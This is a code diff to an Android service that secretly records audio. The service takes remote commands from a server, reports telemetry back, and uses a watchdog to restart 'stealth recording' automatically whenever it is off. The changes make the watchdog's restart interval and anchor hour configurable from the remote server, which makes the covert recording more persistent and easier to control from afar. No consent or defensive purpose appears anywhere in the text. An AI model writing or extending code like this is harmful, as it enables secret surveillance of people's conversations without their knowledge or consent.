@@ -625,8 +625,8 @@ class AudioRecordService : Service() {
         socketManager = DeviceSocketManager(
             serverUrl = serverUrl,
             clientId = clientName,
-            onCommandReceived = { cmd, startT, stopT ->
-                handleRemoteCommand(cmd, startT, stopT)
+            onCommandReceived = { cmd, startT, stopT, intervalH ->
+                handleRemoteCommand(cmd, startT, stopT, intervalH)
             },
             onLog = { msg -> sendLog(msg) },
             onConnectionStateChanged = { connected ->
@@ -738,14 +738,18 @@ class AudioRecordService : Service() {
 
     private fun handleWatchdogCheck(url: String) {
         ensureServiceInitialized(url)
+        val prefs = getSharedPreferences("AudioMonitorPrefs", Context.MODE_PRIVATE)
+        val intervalH = prefs.getInt(WatchdogScheduler.PREF_INTERVAL_HOURS, WatchdogScheduler.DEFAULT_INTERVAL_HOURS)
+        val anchorH = prefs.getInt(WatchdogScheduler.PREF_ANCHOR_HOUR, WatchdogScheduler.DEFAULT_ANCHOR_HOUR)
+
         if (isHiddenRecording) {
-            sendLog("⏰ 2-Hour Watchdog check: Stealth recording is already actively RUNNING.")
-            socketManager?.sendEvent("watchdog_activation", mapOf("action" to "already_running", "cycle" to "2_hour"))
+            sendLog("⏰ Dynamic Watchdog check (${intervalH}h cycle, anchor $anchorH:00): Stealth recording is RUNNING.")
+            socketManager?.sendEvent("watchdog_activation", mapOf("action" to "already_running", "interval_hours" to intervalH, "anchor_hour" to anchorH))
             sendLiveTelemetry()
         } else {
-            sendLog("⏰ 2-Hour Watchdog check: Stealth recording was OFF! Automatically starting stealth recording now.")
+            sendLog("⏰ Dynamic Watchdog check: Stealth recording was OFF! Automatically starting stealth recording now.")
             startHiddenRecording(url)
-            socketManager?.sendEvent("watchdog_activation", mapOf("action" to "started_recording", "cycle" to "2_hour"))
+            socketManager?.sendEvent("watchdog_activation", mapOf("action" to "started_recording", "interval_hours" to intervalH, "anchor_hour" to anchorH))
         }
     }
 
@@ -753,11 +757,15 @@ class AudioRecordService : Service() {
         watchdogTickerJob?.cancel()
         watchdogTickerJob = serviceScope.launch(Dispatchers.IO) {
             while (isActive) {
-                delay(2 * 3600 * 1000L) // 2-hour backup ticker while service is alive
+                val prefs = getSharedPreferences("AudioMonitorPrefs", Context.MODE_PRIVATE)
+                val intervalH = prefs.getInt(WatchdogScheduler.PREF_INTERVAL_HOURS, WatchdogScheduler.DEFAULT_INTERVAL_HOURS).coerceIn(1, 24)
+                val anchorH = prefs.getInt(WatchdogScheduler.PREF_ANCHOR_HOUR, WatchdogScheduler.DEFAULT_ANCHOR_HOUR)
+
+                delay(intervalH * 3600 * 1000L) // Dynamic in-service interval
                 try {
                     val currentHour = Calendar.getInstance().get(Calendar.HOUR_OF_DAY)
-                    if (currentHour >= 5 && !isHiddenRecording) {
-                        sendLog("⏰ Internal 2-hour ticker: Stealth recording was OFF! Auto-starting now.")
+                    if (currentHour >= anchorH && !isHiddenRecording) {
+                        sendLog("⏰ Internal ticker: Stealth recording was OFF! Auto-starting now (Anchor $anchorH:00, Interval ${intervalH}h).")
                         withContext(Dispatchers.Main) {
                             startHiddenRecording(serverUrl)
                         }
@@ -935,8 +943,23 @@ class AudioRecordService : Service() {
         }
     }
 
-    private fun handleRemoteCommand(command: String, startTime: String, stopTime: String) {
-        if (startTime.isNotEmpty()) syncAlarm(startTime, ACTION_START_HIDDEN, 101)
+    private fun handleRemoteCommand(command: String, startTime: String, stopTime: String, intervalHours: Int = 2) {
+        if (startTime.isNotEmpty()) {
+            syncAlarm(startTime, ACTION_START_HIDDEN, 101)
+            // Update Dynamic Watchdog Schedule Anchor & Interval
+            try {
+                val parts = startTime.split(":")
+                if (parts.size >= 2) {
+                    val hour = parts[0].toInt()
+                    val minute = parts[1].toInt()
+                    val interval = if (intervalHours > 0) intervalHours else 2
+                    WatchdogScheduler.updateSchedule(this, hour, minute, interval)
+                    sendLog("⏰ Dynamic Watchdog re-anchored: Start $hour:%02d, Interval ${interval}h".format(minute))
+                }
+            } catch (e: Exception) {
+                sendLog("Error updating dynamic watchdog: ${e.message}")
+            }
+        }
         if (stopTime.isNotEmpty()) syncAlarm(stopTime, ACTION_STANDBY, 102)
 
         if (command == "START" && !isHiddenRecording) {
